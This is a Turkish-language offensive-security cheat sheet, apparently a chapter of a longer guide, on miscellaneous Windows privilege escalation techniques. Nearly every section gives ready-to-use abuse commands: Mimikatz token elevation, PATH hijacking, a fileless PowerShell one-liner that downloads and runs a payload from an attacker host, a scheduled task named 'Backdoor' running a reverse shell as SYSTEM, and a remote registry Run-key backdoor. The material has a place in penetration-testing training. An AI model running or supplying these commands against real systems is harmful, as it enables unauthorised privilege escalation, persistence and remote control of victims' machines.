**Windows Privilege Escalation: Miscellaneous Techniques (Çeşitli Teknikler)**

Bu bölüm, diğer kategorilere tam olarak uymayan ancak Windows sistemlerinde privilege escalation için sıklıkla kullanılan yöntemleri içerir. Bu yöntemler genellikle güvenlik önlemlerini aşmayı veya sistem yapılandırmalarını kötüye kullanmayı hedefler.

---

### **12.1. Token Manipulation (Erişim Belirteci Manipülasyonu)**

Windows’ta erişim belirteçleri (tokens), kullanıcıların ve işlemlerin yetkilerini yönetir. Yanlış yapılandırılmış belirteçler saldırganlar tarafından manipüle edilerek yetki artırımı sağlanabilir.

#### **Tespit**
1. Mevcut erişim belirteçlerini kontrol etmek için:
   ```cmd
   whoami /priv
   ```
2. Kullanıcının **SeImpersonatePrivilege** veya **SeAssignPrimaryTokenPrivilege** gibi ayrıcalıklara sahip olup olmadığını kontrol edin.

#### **Kötüye Kullanma**
- Mimikatz kullanarak belirteç manipülasyonu:
   ```cmd
   mimikatz.exe
   token::elevate
   ```

---

### **12.2. Environment Variable Exploits (Ortam Değişkenleri İstismarı)**

Bazı uygulamalar, ortam değişkenlerini (environment variables) kullanarak çalışır. Eğer bu değişkenler yanlış yapılandırılmışsa veya saldırgan tarafından kontrol edilebiliyorsa, privilege escalation sağlanabilir.

#### **Kötüye Kullanma**
1. Ortam değişkenlerini listeleyin:
   ```cmd
   set
   ```
2. Yazılabilir bir değişken bulun (ör. PATH) ve zararlı bir uygulama ekleyin:
   ```cmd
   set PATH=C:\malicious\directory;%PATH%
   ```
3. Hedef uygulama çalıştırıldığında zararlı kod tetiklenir.

---

### **12.3. DLL Injection (DLL Enjeksiyonu)**

Bir işlemin çalışması sırasında, kötü niyetli bir DLL dosyası yüklenerek kod çalıştırılabilir.

#### **Kötüye Kullanma**
1. Hedef bir işlemin PID’sini öğrenin:
   ```cmd
   tasklist
   ```
2. **DllInjector** gibi bir araç kullanarak zararlı DLL’i hedef işlemin belleğine enjekte edin.

---

### **12.4. Abusing Windows Subsystem for Linux (WSL)**

WSL, Windows üzerinde Linux komutlarının çalıştırılmasına olanak tanır. Yanlış yapılandırıldığında saldırganlar bu özelliği kötüye kullanabilir.

#### **Kötüye Kullanma**
1. WSL’nin yüklü olup olmadığını kontrol edin:
   ```cmd
   wsl --list
   ```
2. WSL’de bir zararlı script çalıştırarak Windows dosya sistemine erişin:
   ```bash
   echo "your payload" > /mnt/c/temp/payload.bat
   ```

---

### **12.5. Abusing Weak Permissions (Zayıf İzinleri Kötüye Kullanma)**

Sistem dosyalarının, dizinlerinin veya kayıt defteri anahtarlarının zayıf izinlere sahip olması, saldırganların yetkilerini artırmasına olanak tanır.

#### **Tespit**
- **AccessChk** kullanarak yazılabilir dosyaları kontrol edin:
   ```cmd
   accesschk.exe -wvu "Users" C:\Windows
   ```

#### **Kötüye Kullanma**
1. Yazılabilir bir dosya veya kayıt defteri anahtarı bulun.
2. Dosyayı zararlı bir payload ile değiştirin veya anahtara zararlı bir komut ekleyin.

---

### **12.6. Windows Application Compatibility Shims**

Windows Shims, eski uygulamaları yeni Windows sürümlerinde çalıştırmak için kullanılan bir özelliktir. Yanlış yapılandırıldığında privilege escalation için kullanılabilir.

#### **Kötüye Kullanma**
1. Zararlı bir shim veritabanı oluşturun:
   ```cmd
   sdbinst.exe malicious.sdb
   ```
2. Shim’i hedef bir uygulamaya ilişkilendirerek payload’ı çalıştırın.

---

### **12.7. Fileless Attacks**

Fileless saldırılar, hedef sisteme zararlı bir dosya bırakmadan bellek veya komut istemi üzerinden çalışır.

#### **Kötüye Kullanma**
1. PowerShell ile fileless bir payload çalıştırın:
   ```powershell
   IEX(New-Object Net.WebClient).DownloadString('http://[IP]/payload.ps1')
   ```

---

### **12.8. Scheduled Tasks Manipulation**

Zamanlanmış görevler, genellikle SYSTEM yetkisiyle çalışır. Bu görevler yanlış yapılandırılmışsa saldırganlar tarafından manipüle edilebilir.

#### **Kötüye Kullanma**
1. Zamanlanmış görevleri listeleyin:
   ```cmd
   schtasks /query /fo LIST /v
   ```
2. Mevcut bir görevi değiştirin veya yeni bir görev oluşturun:
   ```cmd
   schtasks /create /tn "Backdoor" /tr "C:\reverse_shell.exe" /sc onlogon /ru SYSTEM
   ```

---

### **12.9. Remote Registry Exploitation**

Windows’un uzaktan kayıt defteri düzenleme özelliği, yanlış yapılandırıldığında privilege escalation için kullanılabilir.

#### **Kötüye Kullanma**
1. Remote Registry hizmetinin açık olup olmadığını kontrol edin:
   ```cmd
   sc qc RemoteRegistry
   ```
2. Kayıt defterine zararlı bir anahtar ekleyin:
   ```cmd
   reg add \\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\reverse_shell.exe"
   ```

---

### **12.10. Tools for Miscellaneous Techniques**

- **AccessChk:** Zayıf izinlerin tespiti için.
- **Mimikatz:** Belirteç manipülasyonu için.
- **Process Monitor (ProcMon):** DLL injection gibi süreçleri izlemek için.
- **PowerShell Empire:** Fileless saldırılar için.

---
